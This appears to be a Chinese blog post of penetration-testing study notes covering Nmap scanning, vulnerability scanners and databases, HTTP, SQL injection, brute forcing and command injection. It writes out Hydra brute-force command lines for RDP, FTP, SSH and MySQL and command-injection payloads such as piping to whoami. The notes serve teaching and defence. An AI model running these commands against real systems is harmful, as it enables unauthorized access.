端口探测：探测目标主机所开放的端口<br>
版本检测：探测目标主机的网络服务名称以及版本号<br>
系统监测：探测目标主机的操作系统以及网络设备的硬件特性</p>
<p>主机探测：探测网络上的主机，例如列出响应TCP和ICMP请求、icmp请求、开放特别端口的主机。<br>
端口扫描：探测目标主机所开放的端口。<br>
版本检测：探测目标主机的网络服务，判断其服务名称及版本号。<br>
系统检测：探测目标主机的操作系统及网络设备的硬件特性。<br>
支持探测脚本的编写：使用Nmap的脚本引擎（NSE）和Lua编程语言。</p>
<p>典型作用：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625800700470.png" alt="" loading="lazy"><br>
1、通过对设备或者防火墙的探测来审计它的安全性。<br>
2、探测目标主机所开放的端口。<br>
3、网络存储，网络映射，维护和资产管理。（这个有待深入）<br>
4、通过识别新的服务器审计网络的安全性。<br>
5、探测网络上的主机。</p>
<p>我们不能简单的认为开启21端口号就认为开启了FTP服务，我们完全可以将web服务开启在21端口 ，我们找到了存活主机，找到了开放的端口，接下来我们需要下一个扫描<br>
通过服务类型探查可以：<br>
探查活跃主机的系统及开放网络服务的类型<br>
目标主机上运行着何种类型什么版本的操作系统<br>
各个开放端口上监听的是哪些网络服务阶段，在开放端口后面是什么服务。</p>
<p>服务扫描的内容：<br>
标识符抓取<br>
操作系统识别<br>
服务类型识别<br>
绘制网络拓扑</p>
<p><strong>标识符提取</strong><br>
Banner提取是一种活动，用于确定正在运行远程计算机上的服务信息。系统是管理人员和黑客也渗透测试使用经常使用，恶意黑客通过banner获取技术，识别目标主机的操作系统，进一步探测操作系统几倍的了偶东从而可以从这一级别进行渗透测试<br>
操作系统和本系统应用一般是成套出现的，例如LAMP或者LNMP。操作系统的版本也有助于准确定位服务程序或者软件的版本，比如windows server 2003 搭载的IIS为6.0，windows server 2008 R2 搭载的是IIS7.5。</p>
<p>banner中的信息<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625801930768.png" alt="" loading="lazy"></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625802167260.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625802194294.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1625802341325.png" alt="" loading="lazy"></figure>
<p>为什么要识别操作系统？<br>
许多漏洞是系统相关的，而且往往与相应的版本对应；<br>
从操作系统或者应用系统的具体实现中发掘出来的攻击手段都需要辨识系统；<br>
操作系统的信息还可以与其他信息结合起来，比如漏洞库，社工库</p>
<p><strong>操作系统识别的技术和原理</strong><br>
原理：<br>
操作系统扫描大部分都是基于TCP/IP协议栈的指纹检测技术的。</p>
<p>做法：<br>
寻找不同操作系统之间在处理网络数据包上的差异，并且把足够多的差异组合起来，以便精确地识别出一个系统的OS版本。</p>
<p>不同操作系统类型和版本的差异性体现在？<br>
协议栈实现差异－协议栈指纹鉴别<br>
开放端口的差异－端口扫描<br>
应用服务的差异－标识符提取</p>
<p>扫描分类：<br>
被动监听<br>
主动探测</p>
<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1625803603524.png" alt="" loading="lazy"></figure>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625820444778.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625820451630.png" alt="" loading="lazy"></p>
<p>TTL（域名解析在DNS服务器中存留时间）是 Time To Live的缩写，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。TTL是IPv4报头的一个8 bit字段。<br>
注意：TTL与DNS TTL有区别。二者都是生存时间，前者指ICMP包的转发次数（跳数），后者指域名解析信息在DNS中的存在时间。</p>
<figure data-type="image" tabindex="7"><img src="https://jinqipiaopiao.github.io//post-images/1625823274069.png" alt="" loading="lazy"></figure>
<p>服务类型探测：<br>
网络服务类型探查<br>
-确定目标网络中开放端口上绑定的网络应用服务类型和版本<br>
-了解目标系统更丰富信息，可支持进一步的操作系统辨识和漏洞识别</p>
<p>网络服务主动探测<br>
-网络服务旗标抓取和探测：nmap   -sV</p>
<p>Nmap常用参数：<br>
-v详细模式<br>
-p指定端口范围<br>
-O操作系统识别<br>
-A全面检测</p>
<p>-sV探测端口服务器版本<br>
-sA ACK扫描 探测防火墙<br>
-sP Ping扫描 快速扫描<br>
-sS TCP SYN扫描 半开放扫描 比较隐蔽<br>
-sT TCP扫描 完全建立连接 会在目标主机留下日志<br>
-sU UDP扫描 制定端口开放</p>
<p>1.半开放扫描1到65535端口（nmap –sS –p 1-65535 –v ip/url）<br>
2.扫描C段存活主机（nmap –sP ip/url）<br>
3.指定端口扫描（nmap –p 80,3389 ip/url）<br>
4.扫描主机操作系统（nmap –O ip/url）<br>
5.主机详细扫描（nmap –v -A ip/url）<br>
6.穿透防火墙扫描<br>
（nmap –Pn –A ip/url）<br>
（nmap –sS –T4 ip/url）<br>
（nmap –sF –T4 ip/url）<br>
（nmap –sA –T4 ip/url）</p>
<p>漏洞扫描</p>
<p>漏洞：安全脆弱性<br>
一般认为，漏洞是指硬件软件或策略上存在的安全缺陷，从而使得攻击者能够在未授权的情况下访问，控制系统</p>
<p>漏洞扫描：<br>
检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术</p>
<p>漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用的漏洞的一种安全检测（渗透攻击）行为。<br>
漏洞扫描技术是一类重要的网络安全技术，他和防火墙，入侵检测系统互相配合，能够有效提高网络的安全性。通过对网络的扫描，网络管理员能了解网络的安全设置和运行的应用服务，及时发现安全漏洞，客观评估网络风险等级。网络管理员能根据扫描的结果更正网络安全漏洞和系统中的错误设置，在黑客攻击前进行防范。如果说防火墙和网络监视系统是被动的防御手段，那么安全扫描就是一种主动的防范措施，能有效避免黑客攻击行为，做到防患于未然</p>
<p>漏洞扫描可以发现：<br>
网络拓扑和操作系统的脆弱点<br>
开放的端口和进行的服务<br>
应用程序和服务器配置错误<br>
应用程序和服务脆弱点<br>
网络拓扑和操作系统脆弱点</p>
<h1 id="基本原理">基本原理：</h1>
<p>1.漏洞库匹配法<br>
漏洞扫描，收集信息-&gt;漏洞库匹配-&gt;漏洞发现<br>
如：<br>
CGI漏洞，FTP漏洞，SSH漏洞，HTTP漏洞<br>
2.模拟攻击法<br>
目录遍历漏洞探测，跨站漏洞，FTP弱口令探测等</p>
<p>基于网络的漏洞扫描，就是通过远程检测目标主机TCP/IP不同端口的服务，记录目标主机给予的回答。用这种方法来了解目标主机的各种信息，获得相关信息后，与网络漏洞扫描系统提供的漏洞库进行匹配，如果满足匹配条则视为漏洞存在<br>
话有一种方法就是通过模拟黑客的进攻手法，对目标主机系统进行攻击性的安全漏洞扫描，如测试弱口令等，如果模拟攻击成功则视为漏洞存在</p>
<h1 id="漏洞库">漏洞库</h1>
<p>CVSS（Common Vulnerability Scoring System）<br>
CVSS是安全内容自动化协议（SCAP）的一部分<br>
通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新<br>
分值范围：0-10<br>
不同机构按CVSS分值定义威胁的中，高，低威胁级别<br>
CVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响程度<br>
CVSS分值是工业标准，但威胁级别不是</p>
<p>通用漏洞评分系统（CVSS）诞生于2007年，是用于评估系统安全漏洞严重程度的一个行业公开标准。CVSS现在已经进入第二个版本，第三版正在开发中。它的主要目的是帮助人们建立衡量漏洞严重程度的标准，使得人们可以比较漏洞的严重程度，从而确定处理它们的优先级。CVSS得分基于一系列维度上的测量结果，这些测量维度被称为量度（Metrics）。漏洞的最终得分最大为10，最小为0。得分7<sub>10的漏洞通常被认为比较严重，得分在4</sub>6.9之间的是中级漏洞，0~3.9的则是低级漏洞。</p>
<p><strong>其他概念</strong><br>
OVAL（Open Vulnerability and Assessment Language）<br>
• 描述漏洞检测方法的机器可识别语言。<br>
• 详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作。<br>
• OVAL使用XML语言描述，包含了严密的语法逻辑。</p>
<p>CCE<br>
• 描述软件配置缺陷的一种标准化格式。<br>
• 在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作。</p>
<p>CPE（Common Product Enumeration）<br>
• 信息技术产品、系统、软件包的结构化命名规范，分类命名。</p>
<p>CWE（Common Weakness Enumeration）<br>
• 常见漏洞类型的字典，描述不同类型漏洞的特征（访问控制、信息泄露、拒绝服务）</p>
<p><strong>CVE漏洞库</strong><br>
——为了规范漏洞的描述，MITER公司建立了一个通用的漏洞列表（Common Vulnerabilities &amp; Exposures，简称CVE）。<br>
已公开的信息安全漏洞字典，统一的漏洞编号标准<br>
MITRE公司负责维护（非盈利机构）<br>
扫描器的大部分扫描项都对应一个CVE编号<br>
实现不同厂商之间信息交换的统一标准<br>
网址：http://cve.mitre.org/</p>
<p><strong>其他漏洞库</strong></p>
<p>国外漏洞库<br>
BugTraq漏洞库（http://www.securityfocus.com/bid）<br>
ICAT漏洞库（http://icat.nist.gov/icat.cfm）<br>
X-Force漏洞库 （http://xforce.iss.net）<br>
CERT/CC漏洞信息数据库（ http://www.cert.org ）</p>
<p>国内漏洞库<br>
国家计算机网络入侵防范中心（http://www.nipc.org.cn）<br>
绿盟科技（http://www.nsfocus.com）<br>
安全焦点（http://www.xfocus.net）<br>
中国信息安全论坛（http://www.chinafirst.org.cn）<br>
安络科技（http://www.cnns.net）<br>
中国计算机网络应急处理协调中心（http://www.cert.org.cn）</p>
<p>BugTraq漏洞数据库<br>
是SecurityFocus公司维护的一个关于计算机安全漏洞详细信息讨论的邮件列表，内容包括：<br>
漏洞的描述；<br>
漏洞的渗透方法——漏洞的利用；<br>
漏洞的修补方法等<br>
SecurityFocus公司还创建了一个与CVE相兼容的数据库。通过互联网，该数据库向用户提供5种漏洞检索方式：<br>
软件供应商；标题；关键字；BugTraq IDCVE ID<br>
ICAT漏洞库<br>
——美国标准技术研究所维护的一个与CVE相兼容的一个漏洞数据库；<br>
——可以通过Web网页访问，可以以Microsoft Access数据库的格式下载到本地。<br>
X-Force漏洞库<br>
ISS公司维护的一个漏洞数据库 ，每条漏洞记录包括：<br>
漏洞描述；受影响的平台；补救措施；风险等级；影响结果；报告时间；参考链接等。<br>
CERT/CC漏洞信息数据库<br>
——美国计算机安全应急响应组（Computer Emergency Response Team，CERT）与 CC （Common Criteria standard，通用评估准则 ）发布的数据库 ，每条漏洞记录包括：<br>
漏洞描述、影响；<br>
解决方案；<br>
受影响的系统；<br>
参考链接等。</p>
<figure data-type="image" tabindex="8"><img src="https://jinqipiaopiao.github.io//post-images/1625831867784.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://jinqipiaopiao.github.io//post-images/1625835074661.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://jinqipiaopiao.github.io//post-images/1625835221537.png" alt="" loading="lazy"></figure>
<p>WVS拥有大量的自动化特性和手动工具，它的工作方式：<br>
1.它将会扫描整个网站，它通过跟踪站点上的所有链接和robots.txt（如果有的话）而实现扫描。然后WVS就会映射出站点的结构并显示每个文件的细节信息。<br>
2.在上述的发现阶段或扫描过程之后，WVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程。WVS分析每一个页面中可以输入数据的地方，进而尝试所有的输入组合。这是一个自动扫描阶段。<br>
3.在它发现漏洞之后，WVS就会在“Alerts Node（警告节点）”中报告这些漏洞。每一个警告都包含着漏洞信息和如何修复漏洞的建议。<br>
4.在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较。使用报告工具，就可以创建一个专业的报告来总结这次扫描。<br>
WVS自动地检查下面的漏洞和内容：<br>
·版本检查，包括易受攻击的Web服务器，易受攻击的Web服务器技术<br>
·CGI测试，包括检查Web服务器的问题，主要是决定在服务器上是否启用了危险的HTTP方法，例如PUT，TRACE，DELETE等等。<br>
·参数操纵：主要包括跨站脚本攻击（XSS）、SQL注入攻击、代码执行、目录遍历攻击、文件入侵、脚本源代码泄漏、CRLF注入、PHP代码注入、XPath注入、LDAP注入、Cookie操纵、URL重定向、应用程序错误消息等。<br>
·多请求参数操纵：主要是Blind SQL / XPath注入攻击<br>
·文件检查：检查备份文件或目录，查找常见的文件（如日志文件、应用程序踪迹等），以及URL中的跨站脚本攻击，还要检查脚本错误等。<br>
·目录检查，主要查看常见的文件，发现敏感的文件和目录，发现路径中的跨站脚本攻击等。<br>
·Web应用程序：检查特定Web应用程序的已知漏洞的大型数据库，例如论坛、Web入口、CMS系统、电子商务应用程序和PHP库等。<br>
·文本搜索：目录列表、源代码揭示、检查电子邮件地址、微软Office中可能的敏感信息、错误消息等。<br>
·GHDB Google攻击数据库：可以检查数据库中1400多条GHDB搜索项目。<br>
·Web服务：主要是参数处理，其中包括SQL注入/Blind SQL注入（即盲注攻击）、代码执行、XPath注入、应用程序错误消息等。<br>
使用该软件所提供的手动工具，还可以执行其它的漏洞测试，包括输入合法检查、验证攻击、缓冲区溢出等。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625835259133.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625835280331.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625835303830.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625835334869.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625835372987.png" alt="" loading="lazy"></p>
<p>AppScan扫描的原则<br>
全面阶段包含两个阶段：探索和测试<br>
探索阶段：<br>
在第一个阶段里，appscan会通过模仿成web用户点击链接并且填写表单字段来探索站点（web应用程序h或web server）这就是探索阶段。探索阶段可以遍历每个url路径，并且分析后创建测试点<br>
测试阶段：<br>
测试期间，appscan会发送他在探索阶段创建的成千上万个定制的测试请求，通过你定制好的测试策略分析每个测试的响应，最后根据规则是被应用程序中的安全问题，并排列这些安全问题的风险级别。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625838109553.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="11"><img src="https://jinqipiaopiao.github.io//post-images/1625838172571.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://jinqipiaopiao.github.io//post-images/1625838201810.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://jinqipiaopiao.github.io//post-images/1625838266154.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://jinqipiaopiao.github.io//post-images/1625838272486.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://jinqipiaopiao.github.io//post-images/1625838325110.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://jinqipiaopiao.github.io//post-images/1625838356236.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://jinqipiaopiao.github.io//post-images/1625838408835.png" alt="" loading="lazy"></figure>
<h1 id="其他漏洞扫描器">其他漏洞扫描器</h1>
<p>商业：</p>
<p>Netsparker<br>
WebInspect</p>
<p>开源：</p>
<p>W3af<br>
Owasp Zap</p>
<h1 id="2021-07-13">2021-07-13</h1>
<p>#HTTP协议解析</p>
<p>HTTP（HyperText Transfer Protocol）即超文本传输协议，是一种详细规定了浏览器和万维网服务器之间互相通信的规则，它是万维网交换信息的基础，它允许将HTML（超文本标记语言）文档从Web服务器传送到Web浏览器。<br>
HTTP协议目前最新版的版本是1.1，HTTP是一种无状态的协议，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据。<br>
HTTP遵循请求（Request）/应答（Response）模型，Web浏览器向Web服务器发送请求时，Web服务器处理请求并返回适当的应答，如图所示。</p>
<p>HTTP使用一种基于消息的模型：客户端发送一条请求消息，而后由服务器返回一条响应消息。</p>
<p><strong>HTTP请求</strong></p>
<p>HTTP请求包括三部分，分别是请求行（请求方法）、请求头（消息报头）和请求正文。<br>
HTTP请求第一行为请求行，由三部分组成，第一部分说明了该请求时POST请求，第二部分是一个斜杠（/login.php），用来说明请求是该域名根目录下的login.php，第三部分说明使用的是HTTP1.1版本。<br>
HTTP请求第二行至空白行为请求头（也被称为消息头）。其中，HOST代表请求主机地址，User-Agent代表浏览器的标识，请求头由客户端自行设定。<br>
HTTP请求第三行为请求正文，请求正文是可选的，它最常出现在POST请求方式中。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626137217773.png" alt="" loading="lazy"></p>
<p><strong>HTTP响应</strong></p>
<p>HTTP响应的第一行为响应行，其中有HTTP版本（HTTP/1.1）、状态码（200）以及消息“OK”。<br>
第二行至末尾的空白行为响应头，由服务器向客户端发送。<br>
消息头之后是响应正文，是服务器向客户端发送的HTML数据。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626137221463.png" alt="" loading="lazy"></p>
<p><strong>HTTP请求方法</strong></p>
<p>GET：GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（非HTML），那么返回文本是Web容器解析后的HTML源代码。GET请求没有消息主体，因此在消息头后的空白行是没有其他数据。<br>
POST：POST方法也与GET方法相似，但最大的区别在于，GET方法没有请求内容，而POST是有请求内容的。<br>
<strong>HEAD</strong>：这个请求的功能与GET请求相似，不同之处在于服务器不会再其响应中返回消息主体，因此，这种方法可用于检查某一资源在向其提交GET请求前是否存在。<br>
<strong>PUT</strong>：PUT方法用于请求服务器把请求中的实体存储在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据。向服务器上传指定的资源。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626137441142.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="18"><img src="https://jinqipiaopiao.github.io//post-images/1626137640179.png" alt="" loading="lazy"></figure>
<p>PUT：向指定的目录上传附加文件<br>
DELETE：删除指定的资源<br>
COPY：将指定的资源复制到Destination消息头的指定的位置<br>
SEARCH：在一个目录路径中搜索资源<br>
PROPFIND：获取与指定资源有关的信息，如作者，大小与内容类型<br>
TRACE：在响应中返回服务器收到的原始请求，可以使用这种方法避开阻止跨站点脚本的防御</p>
<p><strong>状态码</strong><br>
1xx：信息提示，表示请求已经被成功接收，继续处理<br>
2xx：请求被成功提交<br>
3xx：客户端被重定向到其他资源<br>
4xx：客户端错误状态码，格式错误或者不存在资源<br>
5xx：描述服务器内部错误</p>
<p>eg：<br>
200：客户端请求成功<br>
302：重定向<br>
404：请求资源不存在<br>
400：客户端请求有语法错误不能被服务器解析<br>
401：请求未经授权<br>
403：服务器收到请求，但是拒绝提供服务<br>
500：服务器内部错误<br>
503：服务器当前不能处理客户端的请求</p>
<p>拦截HTTP请求的分析点：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626138712203.png" alt="" loading="lazy"></p>
<p>Host 请求报头域主要用于指定被请求资源的Internet主机和端口。<br>
User-Agent 请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。<br>
Referer 包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。当前请求的原始URL地址。<br>
Cookie 是非常重要的请求头，常用来表示请求者的身份等。<br>
Accept 这个消息头用于告诉服务器客户端愿意接受那些内容，比如图像类，办公文档格式等等。</p>
<p>响应<br>
Server<br>
Location<br>
Content-Type<br>
Content-Encoding<br>
Content-Length<br>
Connection</p>
<p>Server 服务器使用的Web服务器名称。<br>
Location 服务器通过这个头告诉浏览器去访问哪个页面，浏览器接收到这个请求之后，通常会立刻访问Location头所指向的页面。用于在重定向响应中说明重定向的目标地址。<br>
Content-Type 这个消息头用于规定主体的内容类型。例如，HTML文档的内容类型text/html。<br>
Content-Encoding 这个消息头为消息主体中的内容指定编码形式，一些应用程序使用它来压缩响应以加快传输速度。<br>
Content-Length 消息头规定消息主体的字节长度。实体头用于指明实体正文的长度，以字节方式存储的十进制数字来表示。<br>
Connection 允许发送指定连接的选项。</p>
<p>Fiddler是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据（指cookie,html,js,css等文件）。<br>
Burp Suite是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
<h1 id="sql注入">SQL注入</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626147562167.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626147659762.png" alt="" loading="lazy"></p>
<p>静态网页：<br>
html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。<br>
1.不依赖数据库<br>
2.灵活性差，制作、更新、维护麻烦<br>
3.交互性交差，在功能方面有较大的限制<br>
4.安全，不存在SQL注入漏洞</p>
<p>动态网页：<br>
asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。<br>
1.依赖数据库<br>
2.灵活性好，维护简便<br>
3.交互性好，功能强大<br>
4.存在安全风险，可能存在SQL注入漏洞</p>
<figure data-type="image" tabindex="19"><img src="https://jinqipiaopiao.github.io//post-images/1626147842178.png" alt="" loading="lazy"></figure>
<p>sql注入定义：<br>
SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<pre><code>   具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句
</code></pre>
<p><strong>解释性语言</strong><br>
正是基于前面背景的认识，我们知道SQL语言是解释型语言，解释型语言的基本特征就是代码与数据的不区分，从而存在注入数据改变原有语义的缺陷。而SQL注入的本质正是基于此，改变原有语义，注入执行。<br>
就如生活中的造句一样，比如：<br>
我要吃（），正常说（饭），大家都觉得很正常，如果说（虫子），大家就觉得这人口味好重，意思就完全不一样了。</p>
<p><strong>SQL注入作用</strong></p>
<p>绕过登录验证：使用万能密码登录网站后台等<br>
获取敏感数据：获取网站管理员帐号、密码等<br>
文件系统操作：列目录，读取、写入文件等<br>
注册表操作：读取、写入、删除注册表等<br>
执行系统命令：远程执行命令</p>
<p><strong>SQL注入过程</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626148004241.png" alt="" loading="lazy"></p>
<p><strong>场景</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626148045381.png" alt="" loading="lazy"></p>
<p><strong>数据库注释语法</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626148084746.png" alt="" loading="lazy"></p>
<p><strong>SQL注入分类</strong></p>
<p>按照数据类型：数字型，字符型<br>
按返回结果：显错注入，盲注<br>
其他：<br>
post注入：注入字段在post数据中<br>
cookie注入同理<br>
搜索注入：注入处为搜索的点<br>
Base64注入：注入字符串需要经过base64加密<br>
布尔型注入：根据返回页面判断条件真假的注入<br>
时间延迟盲注：即不能根据页面返回内容判断任何信息，用条件语句查看延迟语句是否执行判断<br>
报错会先注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中<br>
联合查询型注入：可以使用union的情况下的注入<br>
堆查询注入：可以同时执行多条语句的执行时的注入</p>
<p>利用工具：sqlmap，jsql<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626148527402.png" alt="" loading="lazy"></p>
<p><strong>SQL注入危害：</strong><br>
这些危害包括但不局限于：</p>
<p>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>
网页篡改：通过操作数据库对特定网页进行篡改。<br>
网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>
数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>
服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>
破坏硬盘数据，瘫痪全系统。</p>
<p>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。</p>
<p>防御：<br>
过滤特殊字符：<br>
单引号，双引号，斜杠，反斜杠，冒号，空字符等的字符<br>
过滤的对象：<br>
用户的输入<br>
提交的url请求中的参数部分<br>
从cookie中得到的数据<br>
部署防sql注入系统或脚本</p>
<h1 id="逻辑漏洞">逻辑漏洞</h1>
<pre><code>   逻辑漏洞只出现于业务流程中（模块功能），也就是说，网站的任何部分都有可能存在着逻辑漏洞。
</code></pre>
<p>挖掘逻辑漏洞的思路步骤如下：<br>
1.发现网站所提供的功能模块，比如：修改密码，找回密码，修改资料等；<br>
2.针对具体功能确定业务流程，详细划分具体步骤；<br>
3.拦截请求，分析各项参数所代表的含义；<br>
4.修改参数值，尝试触发逻辑漏洞；<br>
5.返回第2步骤，对其他功能继续测试。<br>
挖掘逻辑漏洞的两个重点，分析业务流程和拦截请求修改</p>
<h1 id="2021-07-14">2021-07-14</h1>
<h1 id="暴力破解">暴力破解</h1>
<p>定义：暴力破解也被称为枚举测试，穷举法测试，是一种针对密码破译的方法，即：将密码逐个比较，知道找出 真正的密码为止。<br>
攻击者在渗透目标的时候，刚开始可能并不会直接采取暴力破解的方式去入侵，因为使用暴力破解方式是一项比较耗时的攻击。一般攻击者对应用程序“没办法”时才会采取这种手段<br>
B/S架构利用burp suite<br>
C/S架构利用THC-Hydra<br>
官网：https://www.thc.org/thc-hydra/<br>
项目地址：https://github.com/vanhauser-thc/thc-hydra</p>
<p>支持的协议：<br>
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,HTTP-FORM-GET,<br>
HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,<br>
HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,<br>
MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,<br>
PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP,<br>
SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion,<br>
Teamspeak (TS2), Telnet, VMware-Auth, VNC，XMPP</p>
<p>官网：https://www.thc.org/thc-hydra/<br>
项目地址：https://github.com/vanhauser-thc/thc-hydra</p>
<p>支持的协议：<br>
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,HTTP-FORM-GET,<br>
HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,<br>
HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,<br>
MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,<br>
PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP,<br>
SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion,<br>
Teamspeak (TS2), Telnet, VMware-Auth, VNC，XMPP</p>
<p>举例：破解3389：<br>
Hydra.exe –l administrator –P c:\pass.txt 192.168.1.123 rdp –V</p>
<p>破解FTP：<br>
Hydra.exe –l admin –P c:\pass.txt –t 5 192.168.1.123 ftp</p>
<p>破解SSH：<br>
Hydra.exe –L users.txt –P password.txt –e n –t 5 –vV 192.168.1.123 ssh</p>
<p>破解MySQL密码：<br>
Hydra.exe –L c:\users.txt –P c:\pass.txt 192.168.1.123 mysql</p>
<p>防止暴力破解：<br>
1.密码的复杂性（八位以上的字母+数字+特殊字符）<br>
2.验证码（图片，手机验证码，邮箱验证码，答题验证码）<br>
3.登陆策略（限制登陆错误次数）</p>
<p>#远程执行漏洞</p>
<p>RCE漏洞：远程命令执行漏洞； 应用程序有时需要调用一些执行系统命令的函数，如在PHP当中，使用system,exec,shell_exec,passthru,popen,proc_popen等函数可以执行系统命令。<br>
当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成RCE攻击，这就是RCE漏洞。<br>
命令执行漏洞是指攻击者可以随意执行系统命令。它属于高危漏洞之一，也属于代码执行的范畴。<br>
命令执行漏洞不仅存在于B/S架构中，在C/S架构中也常常遇到。</p>
<p>ping 127.0.0.1 &amp;&amp; net user        &amp;&amp;前面的语句若为假则直接报出错，也不执行后边的命令了。 要想继续执行&amp;&amp;后边的命令，那前面的语句只能为真！<br>
ping 127.0.0.1|whoami      直接执行后边的命令<br>
ping 2 || whoami   当前面的语句执行出错时，执行后边的语句</p>
<p>任何脚本语言都可以调用操作系统命令，而各个脚本语言的实现方式都不一样。</p>
<p>区别：<br>
命令执行漏洞是直接调用操作系统命令<br>
代码执行漏洞则是靠执行脚本代码调用操作系统命令</p>
<p><strong>漏洞防范</strong><br>
1：尽量不要使用命令执行函数<br>
2：在进入执行命令函数、方法之前，变量一定要做好过滤，对敏感字符转义<br>
3：在使用动态函数之前，确保使用的函数是指定的函数之一<br>
4：客户端提交的变量在进入执行命令函数前要做好过滤和检测<br>
5：对PHP语言来说，不能完全控制的危险函数最好不要使用</p>
<h1 id="文件包含漏洞">文件包含漏洞</h1>
<p>原理解析：开发人员通常会把可重复使用的函数写道单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程被称为包含</p>
